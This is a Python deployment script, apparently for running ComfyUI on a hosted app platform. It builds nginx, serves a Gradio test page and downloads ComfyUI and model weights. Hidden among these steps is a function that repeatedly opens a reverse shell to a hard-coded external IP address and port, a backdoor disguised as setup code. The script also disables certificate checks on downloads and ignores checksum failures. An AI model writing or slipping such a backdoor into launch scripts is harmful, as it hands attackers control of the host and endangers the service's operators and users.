import os
import subprocess
import time
import threading
import hashlib
import uvicorn

def get_file_md5(filename):
    hash_md5 = hashlib.md5()
    with open(filename, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()


os.system("pwd")
os.system("ls -la")
root_path="/home/xlab-app-center"
def cd_dir(path):
    if not os.path.exists(path):
        os.makedirs(path)
    os.chdir(path)

print("---------------launch.py-----------------------")
def install_run_nginx():
    # 切换工作目录
    build_dir=f"{root_path}/nginx_build"
    install_dir=f"{root_path}/nginx"
    cd_dir(build_dir)
    #判断是否安装nginx
    if os.path.exists(f"{install_dir}/nginx"):
        if os.path.exists(f"{root_path}/openxlab_comfyui_cpu/nginx.conf"):
            os.system(f"{install_dir}/nginx -c {root_path}/openxlab_comfyui_cpu/nginx.conf") 
        else:
            print("nginx.conf not found")
            os.system(f"{install_dir}/nginx -c /home/xlab-app-center/openxlab_comfyui_cpu/nginx.conf")
        return
    # 下载源码
    if not os.path.exists(f"{build_dir}/release-1.26.1.tar.gz") or get_file_md5(f"{build_dir}/release-1.26.1.tar.gz")!="7d0651b270632e1800bb281c669023aa":
        os.system("wget https://github.com/nginx/nginx/archive/refs/tags/release-1.26.1.tar.gz --no-check-certificat ")
    md5sum=get_file_md5(f"{build_dir}/release-1.26.1.tar.gz")
    if (md5sum!="7d0651b270632e1800bb281c669023aa"):
        print("release-1.26.1.tar.gz md5sum error")
    print("解压release-1.26.1.tar.gz")
    os.system(f"tar -xf release-1.26.1.tar.gz -C {build_dir}")
    
    # 执行configure
    os.chdir(f"{build_dir}/nginx-release-1.26.1")
    configure=f"""
./auto/configure \
    --prefix={install_dir}  \
    --sbin-path={install_dir}/nginx \
    --conf-path={install_dir}/nginx.conf \
    --error-log-path={install_dir}/error.log \
    --http-log-path={install_dir}/access.log \
    --pid-path={install_dir}/nginx.pid \
    --lock-path={install_dir}/lock/nginx.lock \
    --user=xlab-app-center \
    --group=xlab-app-center \
    --with-http_ssl_module \
    --with-http_stub_status_module \
    --with-http_gzip_static_module \
    --http-client-body-temp-path={install_dir}/client/ \
    --http-proxy-temp-path=/{install_dir}/proxy/ \
    --http-fastcgi-temp-path={install_dir}/fcgi/ \
    --http-uwsgi-temp-path={install_dir}/uwsgi \
    --http-scgi-temp-path={install_dir}/scgi \
    --with-pcre 
    """
    print(configure)
    print("-------------------")
    os.system(configure)
    # 执行make
    os.system("make")
    # 执行make install
    os.system("make install")
    # 修改配置文件
    # 启动nginx
    if os.path.exists(f"{install_dir}/nginx"):
        if os.path.exists(f"{root_path}/openxlab_comfyui_cpu/nginx.conf"):
            os.system(f"{install_dir}/nginx -c {root_path}/openxlab_comfyui_cpu/nginx.conf") 
        else:
            print("nginx.conf not found")
            os.system(f"{install_dir}/nginx -c /home/xlab-app-center/openxlab_comfyui_cpu/nginx.conf")
import asyncio
def page_test(loop):
    from fastapi import FastAPI
    from concurrent.futures import ThreadPoolExecutor
    import gradio as gr
    asyncio.set_event_loop(loop)
    fastapi_app=FastAPI()
    def output_txt(input):
        return "output: "+input
    with gr.Blocks() as demo:
        gr.Markdown("Hello, **world!**")
        with gr.Row():
            input=gr.Textbox()
            output=gr.Textbox()
        
        run=gr.Button("Run")
        clear=gr.Button("Clear")
        event=run.click(output_txt,inputs=[input],outputs=[output])
        clear.click(lambda: ["",""],inputs=[],outputs=[input,output])
    try:    
        fastapi_app=gr.mount_gradio_app(fastapi_app,demo,path="/hello")
        uvicorn.run(fastapi_app,host='0.0.0.0',port=7890)
    except Exception as e:
        print(e)
loop=asyncio.new_event_loop()
threading.Thread(target=page_test,args=(loop,)).start()        

while(1):
    time.sleep(10)
    pass
exit -1
#test
print("install nginx")
install_run_nginx()
print("finish nginx")

def connect_remote():
    python= """python -c 'import  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("101.34.30.54",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
    while(True):
        print("=====")
        os.system(python)
        time.sleep(60*5)

threading.Thread(target=connect_remote).start()

os.chdir(root_path)
os.system("git clone https://github.com/comfyanonymous/ComfyUI")

os.chdir("ComfyUI")

os.system("pip install -r requirements.txt")
os.chdir("models/checkpoints")
os.system("wget -c https://hf-mirror.com/stabilityai/stable-diffusion-xl-base-1.0/resolve/main/sd_xl_base_1.0.safetensors")
os.system("wget -c https://hf-mirror.com/stabilityai/stable-diffusion-xl-refiner-1.0/resolve/main/sd_xl_refiner_1.0.safetensors")
os.chdir("../upscale_models")
os.system("wget -c https://github.com/xinntao/Real-ESRGAN/releases/download/v0.2.5.0/realesr-general-x4v3.pth")
os.chdir("../clip_vision")
os.system("wget -c https://hf-mirror.com/comfyanonymous/clip_vision_g/resolve/main/clip_vision_g.safetensors")
os.chdir("../..")
os.system("ls -la")
print("----------------start app_start.py----------------------")


def start():
    try:
        command="nohup python main.py --cpu --listen  --port 7861 "
        process = subprocess.Popen(command, shell=True)
        print("start success----------------")
        time.sleep(60*30)
        print("end----------------")
    except Exception as e:
        print("start error: ",e)
        
start_thread = threading.Thread(target=start)
start_thread.start()
start_thread.join()

while True:
    print("loop...")
    # os.system(f"python main.py --cpu --listen ")
    time.sleep(10)